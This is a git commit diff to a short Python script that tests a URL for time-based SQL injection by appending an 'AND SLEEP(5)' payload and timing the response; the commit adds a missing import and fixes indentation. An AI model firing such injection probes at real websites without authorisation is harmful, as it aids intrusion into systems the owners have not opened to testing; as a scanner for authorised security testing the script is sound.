28d4a92b311b691591851e4b913e7e237f4f4257
Faris <36856116+fariskonnakkadan@users.noreply.github.com>
2022-12-18 19:22:38 +0530

    Update timebasedsqli.py

--- timebasedsqli.py
+++ timebasedsqli.py
@@ -1,16 +1,16 @@
 import time
+import requests
 
 def check_vulnerability(url):
   start_time = time.time()
   #send request with injected payload
   response = requests.get(url+" AND SLEEP(5)")
   end_time = time.time()
-
-#if response time is more than 5 seconds, vulnerability is present
-if end_time - start_time > 5:
-  return True
-else:
-  return False
+  #if response time is more than 5 seconds, vulnerability is present
+  if end_time - start_time > 5:
+      return True
+  else:
+      return False
 
 url = "https://example.com/page?id=1"
 
